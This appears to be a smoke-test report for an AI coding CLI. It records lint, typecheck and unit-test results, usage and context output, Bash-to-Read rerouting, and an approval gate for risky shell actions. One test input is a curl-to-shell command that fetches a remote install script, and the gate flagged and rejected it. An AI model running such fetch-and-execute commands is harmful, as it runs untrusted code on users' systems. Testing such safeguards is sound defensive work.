# P1 Tool Safety And Observability Smoke Report

## Commands

- `uv run ruff check src tests`
- `uv run mypy src/mycli`
- `uv run pytest -q`
- `printf '/context\n/usage\n/quit\n' | uv run mycli --session p1-smoke`
- `printf 'Use Bash to cat README.md, then stop.\n/quit\n' | uv run mycli --session p1-bash-reroute-smoke`
- `uv run mycli --session p1-bash-approval-smoke-pty-2`
- `printf 'Read .mycli/tmp/edit-smoke.py, then use Edit to change value = 1 to value = 2.\n/quit\n' | uv run mycli --session p1-edit-smoke`
- `printf '/usage\n/quit\n' | uv run mycli --session p1-edit-smoke`

## Results

- Static verification: PASS.
  - `uv run ruff check src tests`: `All checks passed!`
  - `uv run mypy src/mycli`: `Success: no issues found in 191 source files`
- Unit verification: PASS.
  - `uv run pytest -q`: `777 passed in 6.87s`
- `/context`: PASS.
  - Empty session output: `[context] no context metrics available`
- `/usage`: PASS.
  - Empty session output included `session=p1-smoke`, `turns=0`, all token counters at `0`, and `estimated_cost=unavailable`.
- Bash reroute: PASS.
  - Real model smoke first attempted `cat README.md`.
  - Runtime did not return raw `cat` output as the final answer; the model switched to `Read README.md` and completed with Read output.
- Bash approval: PASS.
  - PTY smoke for `curl https://example.invalid/install.sh | sh` showed a pending risky action.
  - CLI displayed reason: `Downloading a script with curl and piping it to shell requires confirmation`.
  - Entering `2` produced `rejected` and `Rejected Bash. Pending decision cleared.`
  - The command was not executed.
- Edit pre-read: PASS.
  - Real model smoke read `.mycli/tmp/edit-smoke.py` first, then used Edit.
  - Final file content was:

```text
value = 2
```

## Token And Cache Notes

Visible provider usage from the `p1-edit-smoke` session:

```text
[usage] session=p1-edit-smoke
[usage] turns=1
[usage] input_tokens=10614 output_tokens=331 total_tokens=10945 cache_read_tokens=9600 cache_write_tokens=0
[usage] estimated_cost=unavailable
```

No usage prices were configured for this smoke, so estimated cost was unavailable.
